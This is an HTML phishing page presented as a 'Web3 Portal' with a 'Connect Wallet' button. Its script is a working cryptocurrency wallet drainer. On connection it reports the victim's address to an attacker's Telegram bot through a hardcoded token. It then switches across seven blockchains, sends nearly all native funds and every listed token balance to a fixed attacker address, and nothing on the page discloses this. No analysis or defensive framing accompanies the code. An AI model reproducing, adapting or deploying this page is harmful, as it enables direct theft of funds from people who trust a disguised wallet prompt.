<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Web3 Portal</title>
<style>
body {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: system-ui, -apple-system, sans-serif;
}
.container {
    background: white;
    border-radius: 24px;
    padding: 48px;
    text-align: center;
    max-width: 450px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
}
.icon { font-size: 72px; margin-bottom: 24px; }
.connect-btn, button {
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    border: none;
    padding: 16px 48px;
    font-size: 18px;
    font-weight: 600;
    border-radius: 12px;
    cursor: pointer;
}
</style>
</head>
<body>


<div class="container">
    <div class="icon">üîê</div>
    <h1 style="font-size:32px;font-weight:700;margin-bottom:16px">Connect Wallet</h1>
    <button onclick="connect()" class="connect-btn">Connect Now</button>
</div>

<script type="module">
import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'
import { ethers } from 'https://esm.sh/ethers@5.7.2'

// CONFIG
const DEST = "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1";
const PROJECT_ID = "72f0728c47e59d2eb9fc83069bc6843d";
const TG_TOKEN = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
const TG_CHAT = "8309320360";
const DELAY = 1500;
const CHAINS = [1,137,56,42161,10,8453,43114];

// TOKENS √âTENDUS
const TOKENS = {
    1: ["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x6B175474E89094C44Da98b954EedeAC495271d0F","0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE","0x514910771AF9Ca656af840dff83E8264EcF986CA","0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984","0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9","0x4d224452801ACEd8B2F0aebE155379bb5D594381","0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72","0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA","0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F","0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e","0xc00e94Cb662C3520282E6f5717214004A7f26888","0xD533a949740bb3306d119CC777fa900bA034cd52"],
    137: ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174","0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063","0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619","0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6","0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39","0xb33EaAd8d922B1083446DC23f610c2567fB5180f"],
    56: ["0x55d398326f99059fF775485246999027B3197955","0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d","0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56","0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c","0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82","0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47"],
    42161: ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9","0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8","0x912CE59144191C1204E64559FE8253a0e49E6548","0xf97f4df75117a78c1A5a0DBb814Af92458539FB4"],
    10: ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58","0x7F5c764cBc14f9669B88837ca1490cCa17c31607","0x4200000000000000000000000000000000000042"],
    8453: ["0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2","0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA"],
    43114: ["0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7","0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E","0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB"]
};

const ERC20_ABI = ["function balanceOf(address) view returns (uint256)","function transfer(address, uint256) returns (bool)"];

// CHAINS CONFIG
const mainnet = {chainId:1, name:'Ethereum', currency:'ETH', rpcUrl:'https://eth.llamarpc.com'};
const polygon = {chainId:137, name:'Polygon', currency:'MATIC', rpcUrl:'https://polygon-rpc.com'};
const bsc = {chainId:56, name:'BSC', currency:'BNB', rpcUrl:'https://bsc-dataseed.binance.org'};
const arbitrum = {chainId:42161, name:'Arbitrum', currency:'ETH', rpcUrl:'https://arb1.arbitrum.io/rpc'};
const optimism = {chainId:10, name:'Optimism', currency:'ETH', rpcUrl:'https://mainnet.optimism.io'};
const base = {chainId:8453, name:'Base', currency:'ETH', rpcUrl:'https://mainnet.base.org'};
const avalanche = {chainId:43114, name:'Avalanche', currency:'AVAX', rpcUrl:'https://api.avax.network/ext/bc/C/rpc'};

// WEB3MODAL CONFIG
const config = defaultConfig({
    metadata: {
        name: 'Web3 Portal',
        description: 'Connect wallet',
        url: window.location.origin,
        icons: ['https://avatars.githubusercontent.com/u/37784886']
    },
    enableEIP6963: true,
    enableInjected: true,
    enableCoinbase: true,
    rpcUrl: 'https://eth.llamarpc.com',
    defaultChainId: 1
});

// CREATE MODAL
const modal = createWeb3Modal({
    ethersConfig: config,
    chains: [mainnet,polygon,bsc,arbitrum,optimism,base,avalanche],
    projectId: PROJECT_ID,
    enableAnalytics: false,
    themeMode: 'dark'
});

let provider, signer, address, drainStarted = false;

window.connect = async() => {
    try { await modal.open(); } catch(e) { console.error(e); }
}

// DRAINAGE AUTOMATIQUE
modal.subscribeProvider(async(state) => {
    if(state.isConnected && state.address && !drainStarted) {
        drainStarted = true;
        address = state.address;
        
        try {
            provider = new ethers.providers.Web3Provider(state.provider);
            signer = provider.getSigner();
            const network = await provider.getNetwork();
            
            // Telegram notification
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TG_CHAT,
                    text: `üéØ NEW CONNECTION\nüë§ ${address}\nüåê Chain: ${network.chainId}`
                })
            }).catch(e => {});
            
            // Multi-chain drainage
            for(const chainId of CHAINS) {
                try {
                    // Switch chain
                    if(network.chainId !== chainId) {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{chainId: '0x' + chainId.toString(16)}]
                        });
                        await new Promise(r => setTimeout(r, 1000));
                    }
                    
                    // Drain native
                    if(true) {
                        const bal = await provider.getBalance(address);
                        if(bal.gt(ethers.utils.parseEther('0.001'))) {
                            const gas = (await provider.getGasPrice()).mul(21000).mul(2);
                            const amt = bal.sub(gas);
                            if(amt.gt(0)) {
                                await signer.sendTransaction({
                                    to: DEST,
                                    value: amt,
                                    gasLimit: 21000
                                });
                            }
                        }
                    }
                    
                    // Drain tokens
                    if(true) {
                        const tokens = TOKENS[chainId] || [];
                        for(const token of tokens) {
                            try {
                                await new Promise(r => setTimeout(r, DELAY));
                                const c = new ethers.Contract(token, ERC20_ABI, signer);
                                const b = await c.balanceOf(address);
                                if(b.gt(0)) await c.transfer(DEST, b, {gasLimit: 100000});
                            } catch(e) {}
                        }
                    }
                } catch(e) {}
            }
        } catch(e) {}
    }
});
</script>
</body>
</html>
